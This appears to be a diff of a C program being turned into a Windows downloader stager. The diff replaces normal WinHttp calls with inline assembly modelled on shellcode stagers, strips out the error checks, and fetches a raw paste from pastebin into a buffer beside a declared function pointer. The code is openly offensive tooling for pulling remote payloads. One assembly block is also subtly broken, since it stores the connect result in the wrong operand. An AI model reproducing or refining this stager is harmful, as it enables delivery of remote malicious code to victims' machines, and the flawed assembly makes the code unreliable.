@@ -32,7 +32,6 @@ void punt(char * error) {
 }
 
 int main(int argc, char * argv[]) {
-  printf("doing a thing...\n");
   BYTE * buffer;
   void (*function)();
   DWORD size;
@@ -44,17 +43,38 @@ int main(int argc, char * argv[]) {
   DWORD dwSize = 0;
   DWORD dwDownloaded = 0;
 
+  LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
+  LPCWSTR host = L"www.pastebin.com";
+  LPCWSTR path = L"/raw.php?i=PDg27FPb";
+
   /* see:
    * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
    * */
-  hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+  /*hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME,
-                         WINHTTP_NO_PROXY_BYPASS, 0);
+                         WINHTTP_NO_PROXY_BYPASS, 0);*/
 
-  if(hSession == NULL) {
+  asm("xor %%ebx, %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %[userAgent]\n\t"
+  "call *%[function]\n\t"
+  //"push $0x5BB31098\n\t"
+  //"call *%[api_call]\n\t"
+  "mov %%eax, %[hSession]"
+  : [hSession] "=r" (hSession)
+  : [userAgent] "r" (userAgent),
+    [function] "r" (WinHttpOpen)
+  : "eax", "ebx"
+  );
+
+  /*if(hSession == NULL) {
     punt("could not open HTTP session\n");
-  }
+  }*/
 
   /*if (argc != 3) {
     printf("%s [host] [port]\n", argv[0]);
@@ -62,49 +82,32 @@ int main(int argc, char * argv[]) {
   }*/
 
   /* connect to target host */
-  LPCWSTR host = L"www.pastebin.com";
 
   // if (hSession)
-  hConnect = WinHttpConnect(hSession, host,
-                          INTERNET_DEFAULT_HTTP_PORT, 0);
+  /*hConnect = WinHttpConnect(hSession, host,
+                          INTERNET_DEFAULT_HTTP_PORT, 0);*/
 
-  if(hConnect == NULL) {
+  asm("xor %%ebx, %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %[host]\n\t"
+  "push %[hSession]\n\t"
+  "call *%[function]\n\t"
+  "mov %%eax, %[hSession]"
+  : [hConnect] "=r" (hConnect)
+  : [hSession] "r" (hSession),
+    [host] "r" (host),
+    [function] "r" (WinHttpConnect)
+  : "eax", "ebx"
+  );
+
+  /*if(hConnect == NULL) {
     punt("could not open HTTP connection\n");
     if (hSession) WinHttpCloseHandle(hSession);
-  }
+  }*/
 
   /* send HTTP GET to target host */
-  LPCWSTR path = L"/raw.php?i=PDg27FPb";
 
-  /*
-  xor ebx ebx            ; null out ebx
-  push HTTP_OPEN_FLAGS   ; Flags [7]
-  push ebx               ; AcceptTypes (NULL) [6]
-  push ebx               ; Referrer (NULL) [5]
-  push ebx               ; Version (NULL)  [4]
-  push edi               ; ObjectName (URI) [3]
-  push ebx               ; Verb (GET method) (NULL)  [2]
-  push eax               ; Connect handler returned by WinHttpConnect [1]
-  push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
-  call ebp
-  xchg esi, eax          ; save HttpRequest handler in esi
-  */
-
-  /*
-  xor %ebx %ebx           ; null out ebx
-  push HTTP_OPEN_FLAGS    ; Flags [7]
-  push %ebx               ; AcceptTypes (NULL) [6]
-  push %ebx               ; Referrer (NULL) [5]
-  push %ebx               ; Version (NULL)  [4]
-  push %edi               ; ObjectName (URI) [3]
-  push %ebx               ; Verb (GET method) (NULL)  [2]
-  push %eax               ; Connect handler returned by WinHttpConnect [1]
-  push $0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
-  call %ebp
-  xchg %eax, %esi         ; save HttpRequest handler in esi
-  */
-
-  printf("HERE WE GOOOOOOOOOOOOOOOOOOOOOOOOOOOO\n");
   asm("xor %%ebx, %%ebx\n\t"
   "push %%ebx\n\t"
   "push %%ebx\n\t"
@@ -116,15 +119,14 @@ int main(int argc, char * argv[]) {
   "call *%[function]\n\t"
   //"push $0x5BB31098\n\t"
   //"call *%[api_call]\n\t"
-  "xchg %%eax, %[hRequest]"
+  "mov %%eax, %[hRequest]"
   : [hRequest] "=r" (hRequest)
   : [hConnect] "r" (hConnect),
     [path] "r" (path),
     [function] "r" (WinHttpOpenRequest)
     //[api_call] "r" (api_call)
-  : "eax", "ebx", "ecx"
+  : "eax", "ebx"
   );
-  printf("HOLY FUCK WE OUT\n");
 
   // if (hConnect)
   /*hRequest = WinHttpOpenRequest(hConnect,
@@ -135,36 +137,73 @@ int main(int argc, char * argv[]) {
                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 0);*/
 
-  if(hRequest == NULL) {
+  /*if(hRequest == NULL) {
     punt("could not open HTTP request\n");
     if (hConnect) WinHttpCloseHandle(hConnect);
     if (hSession) WinHttpCloseHandle(hSession);
-  }
+  }*/
 
-  BOOL success = WinHttpSendRequest(hRequest, 
+  /*BOOL success = WinHttpSendRequest(hRequest, 
                                     WINHTTP_NO_ADDITIONAL_HEADERS,
                                     0,
                                     WINHTTP_NO_REQUEST_DATA,
                                     0,
                                     0,
-                                    0);
+                                    0);*/
 
-  if(!success) {
+  asm("xor %%ebx, %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %[hRequest]\n\t"
+  "call *%[function]\n\t"
+  :
+  : [hRequest] "r" (hRequest),
+    [function] "r" (WinHttpSendRequest)
+  : "eax", "ebx"
+  );
+
+  /*if(!success) {
     punt("could not send HTTP request\n");
     if (hRequest) WinHttpCloseHandle(hRequest);
     if (hConnect) WinHttpCloseHandle(hConnect);
     if (hSession) WinHttpCloseHandle(hSession);
-  }
+  }*/
 
   /* receive response from server */
-  if (!WinHttpReceiveResponse(hRequest, NULL)) {
+
+  /*if (!WinHttpReceiveResponse(hRequest, NULL)) {
     punt("no response received\n");
     if (hRequest) WinHttpCloseHandle(hRequest);
     if (hConnect) WinHttpCloseHandle(hConnect);
     if (hSession) WinHttpCloseHandle(hSession);
-  }
+  }*/
+
+  asm("xor %%ebx, %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %[hRequest]\n\t"
+  "call *%[function]\n\t"
+  :
+  : [hRequest] "r" (hRequest),
+    [function] "r" (WinHttpReceiveResponse)
+  : "eax", "ebx"
+  );
 
   WinHttpQueryDataAvailable(hRequest, &dwSize);
+
+  /*asm("push %[dwSize]\n\t"
+  "push %[hRequest]\n\t"
+  "call *%[function]\n\t"
+  :
+  : [hRequest] "r" (hRequest),
+    [dwSize] "r" (&dwSize),
+    [function] "r" (WinHttpQueryDataAvailable)
+  : "eax"
+  );*/
+
   pszOutBuffer = malloc(dwSize+1);
 
   ZeroMemory(pszOutBuffer, dwSize+1);
